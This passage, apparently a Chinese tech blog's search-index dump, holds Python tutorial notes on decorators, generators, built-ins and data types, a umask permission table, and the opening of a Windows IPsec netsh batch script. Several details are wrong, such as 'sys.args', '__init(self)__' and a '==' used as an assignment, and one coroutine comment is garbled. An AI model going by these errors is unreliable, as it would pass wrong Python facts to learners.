**kwargs): y = x * 10 return \"计算结果 y : %s\" % y calc(11, a=\"01\") print(\"=======================\") print(calc(11, a=\"01\")) 示例代码2: import time def wrapper(ltype): print(\"装饰器参数传递层 wrapper: \",ltype) def demo(func): print(\"装饰器函数传递层 demo: \", ltype, func) def A(*args, **kwargs): print(time.time()) print(\"装饰器调用函数参数传递层 A : \", args, kwargs,ltype,func) res = func(*args,**kwargs) print(\"装饰器参数传递值 ltype :\", ltype) return res return A return demo @wrapper(ltype=\"Add\") def calc(x,y,name): z = x + y print(z) return z print(calc(1, 2,name=\"123\")) ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:5:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"6. 生成器 在python中, 一边循环,一边计算的机制,就叫做生成器. 生成器不会第一时间将所有结果生成出来,他只会在循环到(调用)的时候才会生成需要的值,因此对于生成器产生的值是不允许切片的,另外,他每次调用也仅仅只保留当前正在被调用的这个值 生成器定义, 对于列表生成式将[] 替换为 (),创建出来的结果就是一个生成器 ,对于函数,包含了yelid变量(可用于模拟多线程)的就是一个生成器. ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:6:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"6.1. 生成器创建 示例1: # 列表创建 arr = [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] # 列表生成式创建 arr = ( i*2 for i in range(10) ) # arr = \u003cgenerator object \u003cgenexpr\u003e at 0x7fa19c4b9570\u003e arr.__next__() 示例2: # 菲波拉契数列 # 0 1 1 2 3 5 8 13 21 34 ... def fib(max): n, a , b = 0, 0, 1 while n \u003c max: yield b a, b = b, a+b n = n + 1 return \"None\" fib(10) # fib(100) = \u003cgenerator object fib at 0x7efc212447c8\u003e # fi = fib(10) # print(next(fi)) # print(fi.__next__()) # 相关解释 # 1. yield 可以看成一个return但也有不同,当循环每次执行到此处的时候,他会返回结果值并暂停此次循环,以等待下一次的调用 # # 2. 等式 a,b = b, a+b 并不等于 # { # a = b # b = a+b # } # 实际等于 # t = (a, a+b) # a = t[0] # b = t[1] # 关于函数的return # 由于生成生成器的调用必须使用__next__()来进行,而数据的生成大部分的时候都将会有最终的结果,而__next__()的时候是不会知道下一个值是否真正的存在, # 此时__next__()就将会抛出一个程序异常,而这个异常的值就是return返回的值 . ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:7:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"6.2. 生成器调用 生成器的调用, 在2.7中使用的是 next(arr), 3.x中使用的是arr.__next__(),不过next(arr) 在3.x同样也可以使用 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:8:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"6.3. 生成器模拟多线程运行示例(协程) def work(name): print(\"%s 准备开始工作 !\" %name) while True: things = yield name # yield 后面可跟一个值,该值为send()调用后返回结果 print(\"%d 号文件已经收到了 , %s 打开了电脑, 开始工作 !\" %(things,name)) import time def people(): w1 = work(\"用户1\") # 函数调用仅代表创出 w1 = work(\"用户1\") # 函数调用仅代表创出建一个生成器 建一个生成器 w2 = work(\"用户2\") w1.__next__() # 只有在调用的时候才会进行第一次next,从而暂停到 yield 处 w2.__next__() for i in range(5): time.sleep(1) num = i+1 print(\"%s 号工作任务文件来了 ! \" % num) ww1 = w1.send(num) ww2 = w2.send(num) print(\"ww1: %s, ww2: %s\" %(ww1,ww2)) people() ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:9:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"7. 构造函数和析构函数 # 构造函数__init(self)__, 用于类被实例化时候使用，通常用于初始化实例变量 ,每个类必须有一个构造函数 # 析构函数__del(self)__, 一般用于在实例被销毁、释放的时候调用，通常用于一些收尾工作，比如数据库链接，打开的临时文件等 class Demo(object): c = 000 def __init__(self,name): self.name = name def __del__(self): print(\"del: \",self.name, self.c) print(\"函数关闭\") d = Demo(\"Tname\") d.c = 111 d.c1 = 222 print(d.c, d.c1 , d.name) ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:10:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"8. 私有属性和私有方法 在Python类中以__开头的变量为私有变量(属性)，以__开头的函数为私有函数(方法),他们在类的外部不可查，不可被调用 class Demo(object): __c = 111 def __init__(self,name): self.name = name self.__age = 123 def __b(): print(\"hello\") d = Demo(\"Tname\") print(d.__c, d.__age) \"\"\" Traceback (most recent call last): File \"/home/cxd/Projects/node/Python/python.project/practice_script/1.py\", line 13, in \u003cmodule\u003e print(d.__c, d.__age) AttributeError: 'Demo' object has no attribute '__c' \"\"\" d.__b() \"\"\" Traceback (most recent call last): File \"/home/cxd/Projects/node/Python/python.project/practice_script/1.py\", line 22, in \u003cmodule\u003e d.__b() AttributeError: 'Demo' object has no attribute '__b' \"\"\" ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:11:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"9. 迭代(Iterable) 从某个地方（比如一个列表）取出一个元素的过程。当我们使用一个循环来遍历某个东西时，这个过程本身就叫迭代 判断对象是否可迭代(对象): from collections.abc import Iterable print(isinstance('abc', Iterable)) # True print(isinstance([], Iterable)) # True print(isinstance(10, Iterable)) # False print(isinstance((x for x in range(10)), Iterable)) # True ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:12:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"10. 迭代器(Iterator) 可以被next()函数调用并不断返回下一个值的对象被成为迭代器 生成器一定是一个迭代器,但迭代器不一定是一个生成器(生成器可能是一个列表或其他不能被next()的可迭代对象,) 判断对象是否是一个迭代器(对象): from collections.abc import Iterator isinstance([], Iterator) # False isinstance(iter([]), Iterator) ## 通过函数 iter() 可将列表等迭代对象变成迭代器 # True isinstance((i for i in range(12)), Iterator) # True ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:13:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"11. 内置函数 详见官方文档 : https://docs.python.org/zh-cn/3.7/library/functions.html Map，Filter 和 Reduce https://eastlakeside.gitbooks.io/interpy-zh/content/Map_n_Filter/ # 判断可迭代对象内值是否全部为真(非0都为真),是:true 否:false print(all([-1,0,1])) # False # 判断可迭代对象内值是否至少有一个为真,是:true 否:false print(any([-1,0,1])) # True # 将10进制转换为二进制 print(bin(1),bin(2),bin(4)) # 0b1 0b10 0b100 # 返回一个新的 bytes 数组。 bytearray 类是一个可变序列，包含范围为 0 \u003c= x \u003c 256 的整数。它有可变序列大部分常见的方法，见 可变序列类型 的描述；同时有 bytes 类型的大部分方法，参见 bytes 和 bytearray 操作。 { arr = bytearray(\"abc\", encoding=\"utf-8\") print(\"arr=%s, arr[0] = %s ,arr[1] = %s ,arr[2] = %s \" %( arr, arr[0], arr[1],arr[2])) # arr = bytearray(b'abc'), arr[0] = 97, arr[1] = 98, arr[2] = 99 arr[0] = 100 print(\"arr=%s, arr[0] = %s ,arr[1] = %s ,arr[2] = %s \" %( arr, arr[0], arr[1],arr[2])) # arr = bytearray(b'dbc'), arr[0] = 100, arr[1] = 98, arr[2] = 99 } # 判断对象是否可被调用,是:true 否:false (即判断对象是否为一个函数或类或者说是是否可以在对象后面加上()进行调用) print(callable(dir)) # dir 是一个函数,因此可以 dir() # True # 将字符串转换为可执行的代码 (自动化 ?) { str=\"\"\" def demo(): print(\"hello word\") demo() \"\"\" test = compile(str,'',\"exec\") exec(test) # hello word } # 从 iterable 对象中过滤出 function 中返回真的那些元素, (结果返回一个生成器) { # filter(function,iterable) res = filter(lambda n: n \u003c 5, range(9)) for i in res: print(i) # 0 1 2 3 4 } # 将 iterable 中的值通过 function 进行处理从而返回处理结果 , (结果返回一个生成器) { # filter(function,iterable) res = map(lambda n: n * 2, range(5)) for i in res: print(i) # 0 2 4 6 8 } # 创建不可遍集合 arr = frozenset([1,2,3,4,5]) # 获取可迭代对象的中的最大值 max([1,2,3,4,5]) # max(1,2,3,4,5) # 将可迭代对象进行排序 { arr1 = { 1:1, 4:3, 2:4, 3:5, 7:6, 8:22, 11:3, 5:51 } print(sorted(arr1)) # [1, 2, 3, 4, 5, 7, 8, 11] print(sorted(arr1.items())) # [(1, 1), (2, 4), (3, 5), (4, 3), (5, 51), (7, 6), (8, 22), (11, 3)] print(sorted(arr1.items(),key=lambda x:x[1])) # # [(1, 1), (4, 3), (11, 3), (2, 4), (3, 5), (7, 6), (8, 22), (5, 51)] arr2 = [1,5,2,3,8,9,4] print(sorted(arr2)) # [1, 2, 3, 4, 5, 8, 9] } # zip 合并可迭代对象,以最小长度显示合并后的长度 a = [1,2,3,4,5,6] b = ['a','b','c','d'] c = zip(a,b) for i in c : print(i) # (1, 'a') # (2, 'b') # (3, 'c') # (4, 'd') ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:14:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"12. 序列化与反序列化(pickle、json) ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:15:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"12.1. 序列化: 指将Python对象序列化为一个字节流，以便将它保存到一个文件、存储到数据库或者通过网络传输它。 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:16:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"12.2. 反序列化: 指从一个对象文件中读取序列化数据，将其反序列化之后返回一个对象 ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:17:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"基础语法","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"1. 循环注意 for item in range(10): print(item) if item == 2: break else: # 当上述循环正常完整的执行完后执行当前分支内容, break为非正常执行完成,不执行else内容 print(\"hello\") i=0 while i \u003c 3: print(i) i +=1 else: # 当上述循环正常执行完成后执行当前分支内容,break为非正常执行 print(\"i=3\",i) ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:1:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"2. 三元运算 # 如果条件成立 值1 否则 值2 result = 值1 if 条件 else 值2 ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:2:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"3. range # 共10个数, 从0 开始 打印到9 for i in range(10) : print(i) #共10个数,从0开始,每隔2个数打印一次 for i in range(0,10,2): print(i) ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:3:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"4. python 模块 ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:4:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"4.1. sys print(sys.path) # 打印系统环境变量 print(sys.args) # 打印脚本传递参数 第一个为脚本名称($(pwd)/script_name) 后续为脚本传递的参数值 ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:5:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"4.2. os print(os.system(\"ls\")) # 执行系统命令,并将结果打印到前台,并返回执行状态(成功)0或非0(失败) print(os.popen(\"ls\").read()) # 执行系统命令,并将结果存入内存中,使用read读取并打印到前台 ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:6:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5. 数组类型 ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:7:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5.1. bytes msg = \"你好 , Python! \" print(msg.encode(encoding=\"UTF-8\")) print(msg.encode(encoding=\"utf-8\").decode(encoding=\"utf-8\")) ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5.2. 列表 ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5.2.1. 列表就是java的数组,不过python的列表可以各个类型混用 ### 列表生成式 ### # arr = [ i*2 for i in range(10) ] 列表中可以是函数调用 # arr = [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] ### 列表生成式 ### arr = [\"a\",\"b\",\"c\",\"d\",\"e\",\"z\",\"z\",1] arr2 = [1,2,3,4] arr3 = [\"01\", \"02\", \"03\"] print(arr[0],arr[3]) #切片: 取出下标为0-2的字符串,包前不包后 print(arr[0:3]) #切片: 取出最后一个值 print(arr[-1]) #切片: 取出最后3个值 print(arr[-3:]) #切片: 取出倒数第二个第三个值 print(arr[-3:-1]) #切片: 每隔一个值取值 print(arr[1:-1:2]) # == arr[::2] # 增加 arr.append(\"zz\") # 插入 arr.insert(0,\"aa\") # 修改 arr[2] == \"bb\" # 删除 arr.remove(\"d\") del arr[4] # 4 : e # 默认删除最后一个值, arr.pop() # 删除倒数第二个值 和 del arr[-2] 等价 arr.pop(-2) # 查询 print(arr.index(\"aa\")) # 统计值总共的个数 print(arr.count(\"z\")) # 反转列表值 arr.reverse() # 列表合并,新列表追加到末尾 arr.extend(arr2) # 删除列表 del arr2 arr.append(arr3) # 列表复制(浅copy: 只复制第一层) { # 作用: 用于创建联合账号 #arr4 = arr[:] #arr4 = list(arr) arr4 = arr.copy() del arr3 arr[0] = \"AA\" arr[-1][0] = \"001\" print(arr) print(arr4) # arr=['AA', 'a', 'bb', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '02', '03']] # arr4=['aa', 'a', 'bb', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '02', '03']] } # 等号赋值 { arr5 = arr arr[11][1] = \"002\" print(arr,arr5) # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] } # 深COPY { import copy # copy.copy 相当于 列表的copy arr6 = copy.deepcopy(arr) arr[-1][2] = \"003\" arr[6] = 11 print(arr,arr6) # ['AA', 'a', 'BB', 'c', 'z', 'z', 11, 1, 2, 3, 4, ['001', '002', '003']] # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] } ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:1","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5.2.2. 列表 COPY 图示 浅 copy 图示 等值图示 深 COPY 图示 ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:2","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5.2.3. 列表遍历索引的几种方式 arr = [\"a\", \"b\", \"c\", \"d\", \"e\", \"z\", \"z\", 1] # 1. n = 0 for i in arr: print(n,i) n += 1 # 2. print(\"-----------\") for i in range(len(arr)): print(i,arr[i]) # 3. print(\"-----------\") for i,item in enumerate(arr): print(i,item) ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:9:3","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5.3. 元组(只读列表) # 只能查看、切片 arr = (\"a\",\"b\",\"c\",\"d\",\"e\",\"z\",\"z\",1) ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:10:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5.4. 字典(map) key, value 字典无序 key 唯一 info = { 'A': \"1\", \"B\": \"2\", \"C\": \"33\" } print(info[\"A\"]) # 存在修改 不存在 新增 info[\"A\"] = \"11\" info[\"D\"] = \"44\" # 删除 del info[\"A\"] info.pop(\"D\") # 随机删除 info.popitem() ## 查询 info[\"A\"] # 存在返回值,不存在抛出异常 print(info.get(\"B\")) # 存在返回值,不存在返回None print(\"B\" in info) # 存在返回True 不存在 返回False # 若 key存在,则不做任何操作,若key不存在,则新增字典值 info.setdefault(\"A\",\"000\") info1 = { \"A\":\"111\", 1 : \"2\" } # 合并两个字典的值,相同key则更新,不同直接合并 info.update(info1) # 将字典转换为列表 info2 = info.items() # 初始化新的字典key 1,2,3 value: default (仅适用于创建一维字典,多为字典存在浅COPY的问题) info3 = dict.fromkeys([1,2,3],\"default\") # 字典循环 for i in info: print(\"in:\", i,info[i]) for k,v in info.items(): print(\"kv:\",k,v) ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:11:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"5.5. 集合 arr = [\"a\", \"b\", \"c\", \"d\", \"e\", \"z\", \"z\", 1] # 将列表转换为集合(合并重复项,可用于列表去重复) arr = set(arr) # 集合定义 arr1 = set([\"a\", \"b\", \"c\", \"dd\", \"ee\", \"z\"]) arr2 = set([\"aa\", \"bb\", \"cc\", \"dd\", \"ee\", \"zz\"]) arr3 = set([\"a\", \"b\", \"c\"]) # 获取集合长度 print(len(arr1)) # 判断字符串是否在集合内 True/False print(\"a\" in arr1) # 判断字符串是否不在集合内 True/False print(\"a\" not in arr1) # 获取集合交集 arr4 = arr1.intersection(arr2) # (arr1 \u0026 arr2) print(arr4) # 获取集合并集 arr5 = arr1.union(arr2) # (arr1 | arr2) print(arr5) # 获取集合差集(arr1中存在,arr2中不存在) arr6 = arr1.difference(arr2) # (arr1 - arr2 ) print(arr6) # 判断 arr1 是不是arr3 的子集, 返回True/false arr7 = arr1.issubset(arr3) print(arr7) # 判断 arr1 是不是arr3 的父集, 返回True/false arr8 = arr1.issuperset(arr3) print(arr8) arr9 = set([1,2,3,4]) arr10 = set([3,4,5,6]) # 对称差集(交集取反?) arr11 = arr9.symmetric_difference(arr10) # (arr9 ^ arr10) print(arr11) ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:12:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"6. 字符串操作 str=\"tHis is test Str\" # 首字母大写 print(str.capitalize()) # 统计字符在str中的个数 print(str.count(\"t\")) # 全小写 print(str.casefold()) # 让字符串居中显示,总共显示50个字符,不够使用# 填充 print(str.center(50,\"#\")) # 判断字符串以什么结尾 True/False print(str.endswith(\"Str\")) # 判断字符串以什么开头 True/False print(str.startswith(\"tHis\")) # 查找字符串下标位置,无结果返回-1,只搜索第一次匹配到的下标 print(str.find(\"H\")) # 判断字符串是否为一个阿拉伯数字或字符 True/False # a-zA-Z0-9 print(\"str123\".isalnum()) # 判断字符串是否为纯英文字符 True/False print(\"Astr\".isalpha()) # 判断字符串是否为一个合法的标识符(变量名) print(\"_str\".isidentifier()) # 判断字符串每个首字母是不是大写 True/False print(\"Str Is tr\".istitle()) { # 表示以str 分割##的每一个字符 print(str.join(\"##\")) # 可用于将列表转换为字符串 print(\"\".join([\"1\",\"2\",\"3\"])) } # 指定字符串长度,若字符串长度不够,使用#在末尾填充 print(str.ljust(50,\"#\")) # 指定字符串长度,若字符串长度不够,使用#在首列填充 print(str.rjust(50,\"#\")) # 将字符串变成全小写 print(str.lower()) # 去除字符串左边的换行符和空格 print(\"\\n str\".lstrip()) # 去除字符串右边的换行符和空格 print(\"\\nstr\".rstrip()) # 去除左右两边的换行符和空格 print(\"\\n str \\n\".strip()) { # 算是一种加密解密的东西吧 p = \"\".maketrans(\"abcd\",\"1234\") print(\"abcf\".translate(p)) } # 将字符串中的一个字符替换为另一个字符,可指定替换个数(从左向右) print(str.replace(\"t\",\"T\")) # 搜索字符串中最后一个匹配字符的下标 print(str.rfind(\"e\")) # 将字符串以特定字符分割(默认空格分割),返回一个列表 print(str.split()) # 反转字符串中的大小写 print(str.swapcase()) ","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:13:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","整理收集"],"content":"Umask码权限对照表,方便查询，不用在去计算了","date":"2022-06-24","objectID":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/","tags":["linux","解决方案"],"title":"Umask码权限对照表","uri":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["linux","整理收集"],"content":"Umask 码权限对照表 umask file dir 000 666 777 001 666 776 002 664 775 003 664 774 004 662 773 005 662 772 006 660 771 007 660 770 010 666 767 011 666 766 012 664 765 013 664 764 014 662 763 015 662 762 016 660 761 017 660 760 020 646 757 021 646 756 022 644 755 023 644 754 024 642 753 025 642 752 026 640 751 027 640 750 030 646 747 031 646 746 032 644 745 033 644 744 034 642 743 035 642 742 036 640 741 037 640 740 040 626 737 041 626 736 042 624 735 043 624 734 044 622 733 045 622 732 046 620 731 047 620 730 050 626 727 051 626 726 052 624 725 053 624 724 054 622 723 055 622 722 056 620 721 057 620 720 060 606 717 061 606 716 062 604 715 063 604 714 064 602 713 065 602 712 066 600 711 067 600 710 070 606 707 071 606 706 072 604 705 073 604 704 074 602 703 075 602 702 076 600 701 077 600 700 100 666 677 101 666 676 102 664 675 103 664 674 104 662 673 105 662 672 106 660 671 107 660 670 110 666 667 111 666 666 112 664 665 113 664 664 114 662 663 115 662 662 116 660 661 117 660 660 120 646 657 121 646 656 122 644 655 123 644 654 124 642 653 125 642 652 126 640 651 127 640 650 130 646 647 131 646 646 132 644 645 133 644 644 134 642 643 135 642 642 136 640 641 137 640 640 140 626 637 141 626 636 142 624 635 143 624 634 144 622 633 145 622 632 146 620 631 147 620 630 150 626 627 151 626 626 152 624 625 153 624 624 154 622 623 155 622 622 156 620 621 157 620 620 160 606 617 161 606 616 162 604 615 163 604 614 164 602 613 165 602 612 166 600 611 167 600 610 170 606 607 171 606 606 172 604 605 173 604 604 174 602 603 175 602 602 176 600 601 177 600 600 200 466 577 201 466 576 202 464 575 203 464 574 204 462 573 205 462 572 206 460 571 207 460 570 210 466 567 211 466 566 212 464 565 213 464 564 214 462 563 215 462 562 216 460 561 217 460 560 220 446 557 221 446 556 222 444 555 223 444 554 224 442 553 225 442 552 226 440 551 227 440 550 230 446 547 231 446 546 232 444 545 233 444 544 234 442 543 235 442 542 236 440 541 237 440 540 240 426 537 241 426 536 242 424 535 243 424 534 244 422 533 245 422 532 246 420 531 247 420 530 250 426 527 251 426 526 252 424 525 253 424 524 254 422 523 255 422 522 256 420 521 257 420 520 260 406 517 261 406 516 262 404 515 263 404 514 264 402 513 265 402 512 266 400 511 267 400 510 270 406 507 271 406 506 272 404 505 273 404 504 274 402 503 275 402 502 276 400 501 277 400 500 300 466 477 301 466 476 302 464 475 303 464 474 304 462 473 305 462 472 306 460 471 307 460 470 310 466 467 311 466 466 312 464 465 313 464 464 314 462 463 315 462 462 316 460 461 317 460 460 320 446 457 321 446 456 322 444 455 323 444 454 324 442 453 325 442 452 326 440 451 327 440 450 330 446 447 331 446 446 332 444 445 333 444 444 334 442 443 335 442 442 336 440 441 337 440 440 340 426 437 341 426 436 342 424 435 343 424 434 344 422 433 345 422 432 346 420 431 347 420 430 350 426 427 351 426 426 352 424 425 353 424 424 354 422 423 355 422 422 356 420 421 357 420 420 360 406 417 361 406 416 362 404 415 363 404 414 364 402 413 365 402 412 366 400 411 367 400 410 370 406 407 371 406 406 372 404 405 373 404 404 374 402 403 375 402 402 376 400 401 377 400 400 400 266 377 401 266 376 402 264 375 403 264 374 404 262 373 405 262 372 406 260 371 407 260 370 410 266 367 411 266 366 412 264 365 413 264 364 414 262 363 415 262 362 416 260 361 417 260 360 420 246 357 421 246 356 422 244 355 423 244 354 424 242 353 425 242 352 426 240 351 427 240 350 430 246 347 431 246 346 432 244 345 433 244 344 434 242 343 435 242 342 436 240 341 437 240 340 440 226 337 441 226 336 442 224 335 443 224 334 444 222 333 445 222 332 446 220 331 447 220 330 450 226 327 451 226 326 452 224 325 453 224 324 454 222 323 455 222 322 456 220 321 457 220 320 460 206 317 461 206 316 462 204 315 463 204 314 464 202 313 465 202 312 466 200 311 467 200 310 470 206 307 471 206 306 472 204 305 473 204 304 474 202 303 475 202 302 476 200 301 477 200 300 500 266 277 501 266 276 502 264 275 503 264 274 504 262 273 505 262 272 506 260 271 507 260 270 510 266 267 511 266 266 512 264 265 ","date":"2022-06-24","objectID":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/:1:0","tags":["linux","解决方案"],"title":"Umask码权限对照表","uri":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["那些年的收藏"],"content":"IPSEC","date":"2022-06-24","objectID":"/posts/scripts/bat/ipsec/","tags":["bat","ipsec","windows","scripts"],"title":"windows 本地安全策略设置","uri":"/posts/scripts/bat/ipsec/"},{"categories":["那些年的收藏"],"content":"开机临时关闭本地安全策略(防止配置出错，导致无法登录) netsh ipsec static set policy name=我的规则 assign=n ping 127.0 -n 300 \u003enul 2\u003enul netsh ipsec static set policy name=我的规则 assign=y net start PolicyAgent ","date":"2022-06-24","objectID":"/posts/scripts/bat/ipsec/:1:0","tags":["bat","ipsec","windows","scripts"],"title":"windows 本地安全策略设置","uri":"/posts/scripts/bat/ipsec/"},{"categories":["那些年的收藏"],"content":"本地安全策略初始化设置脚本 @echo off title DD-IP策略设置 color 0A echo 一般配置为\"1\"即可(注:需要主动配置信任的远程ip) echo 设置ipsec前首先要关闭系统防火墙。 echo 